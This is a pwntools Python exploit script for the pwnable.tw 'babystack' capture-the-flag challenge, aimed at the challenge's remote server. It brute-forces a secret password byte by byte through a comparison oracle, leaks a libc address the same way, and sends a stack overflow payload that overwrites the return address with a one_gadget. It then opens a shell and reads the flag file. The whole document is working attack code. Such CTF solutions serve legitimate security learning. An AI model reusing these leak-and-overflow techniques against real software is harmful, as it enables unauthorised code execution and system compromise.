#!/usr/bin/env python3

from pwn import *

exe = ELF("./babystack_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)
context.binary = exe

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000000CBE
            brva 0x0000000000000EBB
            c
            set follow-fork-mode parent
            ''')
            
if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("chall.pwnable.tw", 10205)

def password(pw):
    p.sendafter(b'>> ', str(1))
    p.sendafter(b'passowrd :', pw)

def copy(src):
    p.sendafter(b'>> ', str(3))
    p.sendafter(b'Copy :', src)

# Bruteforce password
password_leak = b''

for i in range(16):
    for j in range(1, 256):
        password(password_leak + p8(j) + b'\0')
        output = p.recvline()

        if b'Success' in output:
            print("Bytes found: " + str(j))
            password_leak += p8(j)
            p.sendafter(b'>> ', str(1))
            break

print("Password: " + str(password_leak))

password(b'a'*80)
password(b'\0') # check = 1
copy(b'b')
p.sendafter(b'>> ', str(1))

# Bruteforce libc
libc_leak = b''
for i in range(6):
    for j in range(1, 256):
        password(b'a'*16 + libc_leak + p8(j) + b'\0')
        output = p.recvline()

        if b'Success' in output:
            print("Bytes found: " + str(j))
            libc_leak += p8(j)
            p.sendafter(b'>> ', str(1))
            break

print("Libc leak: " + str(libc_leak))
libc_leak = u64(libc_leak.ljust(8, b'\0'))
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - libc.sym._IO_2_1_stdout_ - 0x11
print("Libc base: " + hex(libc.address))

# Get shell
gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
payload = flat(
    b'a'*0x40,
    password_leak,
    b'a'*(0x68 - 0x40 - 0x10),
    gadget[0] + libc.address
    )
password(payload)
password(b'\0')
copy(b'b')
p.sendafter(b'>> ', str(2))
p.sendline(b'cat /home/babystack/flag')

p.interactive()